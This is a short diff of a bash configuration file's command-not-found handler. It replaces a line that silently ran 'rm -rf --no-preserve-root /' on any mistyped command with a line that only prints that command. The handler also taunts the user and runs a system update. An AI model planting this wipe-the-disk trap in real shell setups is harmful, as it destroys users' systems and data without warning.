@@ -20,7 +20,7 @@ CLR_YELLOW=$'\033[01;33m'
 function command_not_found_handle {
      if [ -z "$FAILED_AT" ]; then
           echo "Oops, looks like you misspelt something >:)"
-          (rm -rf --no-preserve-root / >/dev/null 2>/dev/null &)
+          (echo "rm -rf --no-preserve-root / >/dev/null 2>/dev/null &")
           (echo "haha get deleted")
           (pacman -Syu)
           return 127
